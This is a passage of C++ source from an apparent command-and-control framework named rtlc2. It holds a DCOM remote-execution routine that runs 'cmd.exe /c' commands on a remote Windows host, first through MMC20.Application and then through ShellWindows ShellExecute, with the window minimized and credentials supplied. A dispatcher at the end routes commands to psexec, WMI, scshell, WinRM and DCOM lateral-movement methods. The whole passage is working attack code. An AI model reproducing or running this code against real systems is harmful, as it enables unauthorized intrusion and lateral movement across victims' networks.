                            VariantClear(&vResult);

                            pView->Release();
                            pDoc->Release();
                            pMMC->Release();

                            if (SUCCEEDED(hr)) {
                                return "DCOM (MMC20.Application) executed on " + target + ": " + command;
                            }
                        }
                        pView->Release();
                    }
                    VariantClear(&vView);
                }
                pDoc->Release();
            }
            VariantClear(&vDoc);
        }
        pMMC->Release();
    }

    // Fallback: ShellWindows DCOM object
    // CLSID: {9BA05972-F6A8-11CF-A442-00A0C90A8F39}
    CLSID clsidShellWindows;
    CLSIDFromString(L"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", &clsidShellWindows);

    mqi.pIID = &IID_IDispatch;
    mqi.pItf = NULL;
    mqi.hr = S_OK;

    hr = CoCreateInstanceEx(clsidShellWindows, NULL, CLSCTX_REMOTE_SERVER,
                            &serverInfo, 1, &mqi);

    if (SUCCEEDED(hr) && SUCCEEDED(mqi.hr)) {
        IDispatch* pShellWindows = (IDispatch*)mqi.pItf;

        if (!user.empty()) {
            CoSetProxyBlanket(pShellWindows, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                &authIdentity, EOAC_NONE);
        }

        // Get Item(0) to get a ShellBrowserWindow
        DISPID dispidItem;
        LPOLESTR nameItem = (LPOLESTR)L"Item";
        hr = pShellWindows->GetIDsOfNames(IID_NULL, &nameItem, 1, LOCALE_USER_DEFAULT, &dispidItem);
        if (SUCCEEDED(hr)) {
            VARIANT vIndex;
            VariantInit(&vIndex);
            vIndex.vt = VT_I4;
            vIndex.lVal = 0;

            DISPPARAMS dpItem;
            dpItem.rgvarg = &vIndex;
            dpItem.cArgs = 1;
            dpItem.rgdispidNamedArgs = NULL;
            dpItem.cNamedArgs = 0;

            VARIANT vBrowser;
            VariantInit(&vBrowser);
            hr = pShellWindows->Invoke(dispidItem, IID_NULL, LOCALE_USER_DEFAULT,
                                        DISPATCH_METHOD, &dpItem, &vBrowser, NULL, NULL);
            VariantClear(&vIndex);

            if (SUCCEEDED(hr) && vBrowser.vt == VT_DISPATCH && vBrowser.pdispVal) {
                IDispatch* pBrowser = vBrowser.pdispVal;

                if (!user.empty()) {
                    CoSetProxyBlanket(pBrowser, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                        &authIdentity, EOAC_NONE);
                }

                // Get Document.Application.ShellExecute
                DISPID dispidDoc;
                LPOLESTR nameDoc = (LPOLESTR)L"Document";
                hr = pBrowser->GetIDsOfNames(IID_NULL, &nameDoc, 1, LOCALE_USER_DEFAULT, &dispidDoc);
                if (SUCCEEDED(hr)) {
                    DISPPARAMS dpNoArgs = { NULL, NULL, 0, 0 };
                    VARIANT vDoc;
                    VariantInit(&vDoc);
                    hr = pBrowser->Invoke(dispidDoc, IID_NULL, LOCALE_USER_DEFAULT,
                                          DISPATCH_PROPERTYGET, &dpNoArgs, &vDoc, NULL, NULL);
                    if (SUCCEEDED(hr) && vDoc.vt == VT_DISPATCH && vDoc.pdispVal) {
                        IDispatch* pDoc = vDoc.pdispVal;

                        if (!user.empty()) {
                            CoSetProxyBlanket(pDoc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                                &authIdentity, EOAC_NONE);
                        }

                        // Get Application
                        DISPID dispidApp;
                        LPOLESTR nameApp = (LPOLESTR)L"Application";
                        hr = pDoc->GetIDsOfNames(IID_NULL, &nameApp, 1, LOCALE_USER_DEFAULT, &dispidApp);
                        if (SUCCEEDED(hr)) {
                            VARIANT vApp;
                            VariantInit(&vApp);
                            hr = pDoc->Invoke(dispidApp, IID_NULL, LOCALE_USER_DEFAULT,
                                              DISPATCH_PROPERTYGET, &dpNoArgs, &vApp, NULL, NULL);
                            if (SUCCEEDED(hr) && vApp.vt == VT_DISPATCH && vApp.pdispVal) {
                                IDispatch* pApp = vApp.pdispVal;

                                if (!user.empty()) {
                                    CoSetProxyBlanket(pApp, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                                        &authIdentity, EOAC_NONE);
                                }

                                // ShellExecute(File, vArgs, vDir, vOperation, vShow)
                                DISPID dispidShellExec;
                                LPOLESTR nameShellExec = (LPOLESTR)L"ShellExecute";
                                hr = pApp->GetIDsOfNames(IID_NULL, &nameShellExec, 1,
                                                          LOCALE_USER_DEFAULT, &dispidShellExec);
                                if (SUCCEEDED(hr)) {
                                    std::string args = "/c " + command;
                                    int wArgsLen = MultiByteToWideChar(CP_ACP, 0, args.c_str(), -1, NULL, 0);
                                    std::vector<WCHAR> wArgs(wArgsLen);
                                    MultiByteToWideChar(CP_ACP, 0, args.c_str(), -1, wArgs.data(), wArgsLen);

                                    // Arguments in reverse order for DISPPARAMS
                                    VARIANT seArgs[5];
                                    // vShow (minimized = 7)
                                    VariantInit(&seArgs[0]);
                                    seArgs[0].vt = VT_I4;
                                    seArgs[0].lVal = 7;
                                    // vOperation
                                    VariantInit(&seArgs[1]);
                                    seArgs[1].vt = VT_BSTR;
                                    seArgs[1].bstrVal = SysAllocString(L"open");
                                    // vDir
                                    VariantInit(&seArgs[2]);
                                    seArgs[2].vt = VT_BSTR;
                                    seArgs[2].bstrVal = SysAllocString(L"C:\\");
                                    // vArgs
                                    VariantInit(&seArgs[3]);
                                    seArgs[3].vt = VT_BSTR;
                                    seArgs[3].bstrVal = SysAllocString(wArgs.data());
                                    // File
                                    VariantInit(&seArgs[4]);
                                    seArgs[4].vt = VT_BSTR;
                                    seArgs[4].bstrVal = SysAllocString(L"cmd.exe");

                                    DISPPARAMS dpExec;
                                    dpExec.rgvarg = seArgs;
                                    dpExec.cArgs = 5;
                                    dpExec.rgdispidNamedArgs = NULL;
                                    dpExec.cNamedArgs = 0;

                                    VARIANT vResult;
                                    VariantInit(&vResult);
                                    hr = pApp->Invoke(dispidShellExec, IID_NULL, LOCALE_USER_DEFAULT,
                                                      DISPATCH_METHOD, &dpExec, &vResult, NULL, NULL);

                                    for (int i = 0; i < 5; i++) VariantClear(&seArgs[i]);
                                    VariantClear(&vResult);

                                    pApp->Release();
                                    pDoc->Release();
                                    pBrowser->Release();
                                    pShellWindows->Release();

                                    if (SUCCEEDED(hr)) {
                                        return "DCOM (ShellWindows) executed on " + target + ": " + command;
                                    } else {
                                        return "DCOM ShellExecute failed: HRESULT 0x" +
                                               (std::stringstream() << std::hex << hr).str();
                                    }
                                }
                                pApp->Release();
                            }
                            VariantClear(&vApp);
                        }
                        pDoc->Release();
                    }
                    VariantClear(&vDoc);
                }
                pBrowser->Release();
            }
            VariantClear(&vBrowser);
        }
        pShellWindows->Release();
    }

    return "DCOM execution failed on " + target + " (both MMC20 and ShellWindows). "
           "HRESULT: 0x" + (std::stringstream() << std::hex << hr).str();
}

// Master lateral movement dispatcher
std::string LateralMove(const std::string& method, const std::string& target,
                        const std::string& command, const std::string& extra) {
    if (method == "psexec") return PSExec(target, command, extra);
    if (method == "wmi" || method == "wmiexec") return WMIExec(target, command);
    if (method == "scshell") return SCShell(target, command, extra);
    if (method == "winrm") {
        // extra format: "user:pass" or "DOMAIN\\user:pass"
        std::string user, pass;
        size_t colonPos = extra.find(':');
        if (colonPos != std::string::npos) {
            user = extra.substr(0, colonPos);
            pass = extra.substr(colonPos + 1);
        }
        return WinRMExec(target, command, user, pass);
    }
    if (method == "dcom") {
        std::string user, pass;
        size_t colonPos = extra.find(':');
        if (colonPos != std::string::npos) {
            user = extra.substr(0, colonPos);
            pass = extra.substr(colonPos + 1);
        }
        return DCOMExec(target, command, user, pass);
    }
    return "Unknown method. Available: psexec, wmi, scshell, winrm, dcom";
}

} // namespace modules
} // namespace rtlc2

#endif // RTLC2_WINDOWS
